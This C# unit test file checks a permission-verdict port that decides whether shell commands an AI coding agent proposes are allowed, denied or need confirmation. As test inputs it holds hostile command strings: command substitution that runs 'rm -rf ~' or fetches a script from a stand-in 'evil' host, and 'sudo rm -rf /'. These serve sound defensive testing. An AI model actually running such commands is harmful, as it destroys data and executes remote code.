using RtkSharp.Rewrite;
using Xunit;

namespace RtkSharp.Tests.Rewrite;

/// <summary>
/// Tests for the permission verdict port of rtk's <c>src/hooks/permissions.rs</c>.
/// </summary>
/// <remarks>
/// These exercise the rule-injected core <see cref="Permissions.CheckCommandWithRules"/> with
/// EXPLICIT rule lists rather than <see cref="Permissions.CheckCommand"/> (which now loads the
/// host's real <c>~/.claude/settings.json</c>) — keeping them deterministic and independent of the
/// developer machine, exactly as the Rust unit tests inject rules directly. The empty-rule cases
/// reproduce Claude Code's no-config state: deny/allow can never match and every command collapses
/// to Ask (Rust's <c>Default</c>, folded into <see cref="PermissionVerdict.Ask"/> here), except
/// unattestable constructs, which always resolve to Ask regardless of rules.
/// </remarks>
public class PermissionsTests
{
    [Theory]
    // No-config state: with no rules, every rewritable command collapses to Ask.
    [InlineData("git status")]
    [InlineData("cd foo && git status")]
    [InlineData("git push --force")]
    [InlineData("git status 2>&1")] // fd-dup redirect is attestable
    [InlineData("git status && git push --force")]
    [InlineData("git status; git push")]
    [InlineData("git status | grep foo")]
    [InlineData("cargo build")]
    public void CheckCommandWithRules_NoRules_CollapsesToAsk(string cmd)
    {
        Assert.Equal(PermissionVerdict.Ask, Permissions.CheckCommandWithRules(cmd, [], [], []));
    }

    [Theory]
    // Unattestable constructs always resolve to Ask, regardless of rules — ported directly from
    // permissions.rs::test_substitution_never_auto_allowed. A permissive `*` allow rule is present
    // to prove the unattestable guard fires BEFORE the allow evaluation.
    [InlineData("git log --pretty=$(rm -rf ~)")]
    [InlineData("git status `whoami`")]
    [InlineData("git diff $(curl https://evil/x.sh)")]
    [InlineData("git log > out.txt")]
    public void CheckCommandWithRules_UnattestableConstruct_AlwaysAsk(string cmd)
    {
        Assert.Equal(PermissionVerdict.Ask, Permissions.CheckCommandWithRules(cmd, [], [], ["*"]));
    }

    [Fact]
    public void CheckCommandWithRules_LoadedAllowRule_ReturnsAllow()
    {
        // The host's real settings has `Bash(git:*)`; the extracted `git:*` pattern makes
        // `git status` Allow — this is exactly what makes `rtk rewrite "git status"` exit 0.
        Assert.Equal(
            PermissionVerdict.Allow,
            Permissions.CheckCommandWithRules("git status", [], [], ["git:*"]));
    }

    [Fact]
    public void CheckCommandWithRules_DenyOverridesAllow()
    {
        Assert.Equal(
            PermissionVerdict.Deny,
            Permissions.CheckCommandWithRules("git push --force", ["git push --force"], [], ["git:*"]));
    }

    [Theory]
    [InlineData("git push --force", "git push --force", true)]
    [InlineData("git push --forceful", "git push --force", false)]
    [InlineData("sudo rm -rf /", "sudo:*", true)]
    [InlineData("sudoedit /etc/hosts", "sudo:*", false)]
    [InlineData("anything at all", "*", true)]
    [InlineData("git push --force", "* --force", true)]
    [InlineData("git push", "* --force", false)]
    [InlineData("git push main", "git * main", true)]
    [InlineData("git push develop", "git * main", false)]
    public void CommandMatchesPattern_MatchesRustSemantics(string cmd, string pattern, bool expected)
    {
        Assert.Equal(expected, Permissions.CommandMatchesPattern(cmd, pattern));
    }
}
